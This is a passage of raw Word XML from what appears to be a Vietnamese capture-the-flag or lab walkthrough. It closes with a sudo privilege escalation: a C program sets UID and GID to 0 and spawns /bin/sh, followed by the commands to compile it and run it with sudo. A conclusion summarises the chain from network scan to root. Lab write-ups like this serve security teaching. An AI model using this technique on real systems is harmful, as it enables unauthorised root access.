    </w:p>
    <w:p w14:paraId="30609317" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>int main(void) {</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    setgid(0); setuid(0);</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    execl("/bin/sh", "sh", 0);</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F7B3B9" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B675EE" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>gcc dont_even_bother.c -o dont_even_bother</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02D70E5F" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F4EFD00" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>sudo ./dont_even_bother</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644C9C1A" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Xóa file cũ, tạo mã nguồn C đặt UID và GID về 0 rồi gọi /bin/sh. Biên dịch chương trình với gcc và chạy bằng sudo. Nếu quyền sudo cho phép thực thi file này, shell sinh ra có quyền root.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D5739E6" w14:textId="40737E67" w:rsidR="001F32E9" w:rsidRDefault="001F32E9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="29C500A6" wp14:editId="20FABB80">
            <wp:extent cx="6152515" cy="2661285"/>
            <wp:effectExtent l="0" t="0" r="635" b="5715"/>
            <wp:docPr id="45360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2069" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId34"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="2661285"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2299E182" w14:textId="0B8457C4" w:rsidR="00854BD8" w:rsidRDefault="001F32E9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6F27C1FB" wp14:editId="001FEE2A">
            <wp:extent cx="6152515" cy="2027555"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="31395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7392" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId35"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="2027555"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Kết luận</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="046D0568" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:t>Quá trình thực hiện đi từ dò quét mạng, truy cập SSH, phân tích dữ liệu bắt gói, phát hiện dịch vụ nội bộ, sử dụng SSH key và cuối cùng khai thác quyền sudo để đạt quyền root. Các địa chỉ IP trong lệnh cần được thay bằng giá trị thực tế của môi trường lab.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00854BD8"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90717">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1540630946">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1562012738">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1103575547">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1670476588">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1323314468">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="320280041">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1586256650">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="125982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640"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="001F32E9"/>
    <w:rsid w:val="002349DE"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="003659E7"/>
    <w:rsid w:val="004364EA"/>
    <w:rsid w:val="00445B3E"/>
    <w:rsid w:val="0072187C"/>
    <w:rsid w:val="00854BD8"/>
    <w:rsid w:val="00920C3A"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B405A0"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00C46C15"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D13AA3"/>
    <w:rsid w:val="00DA4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6B838"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{03A30F2C-7025-4EAD-8B75-96E07B9E8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49DE"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="002349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mailto:genphlux@192.168.56.116" TargetMode="External"/><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drive.google.com/drive/folders/1k8K8qn8KmFWZ137e53dDQiK6-mQU-FIl"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16</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2026-07-25T05:53:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>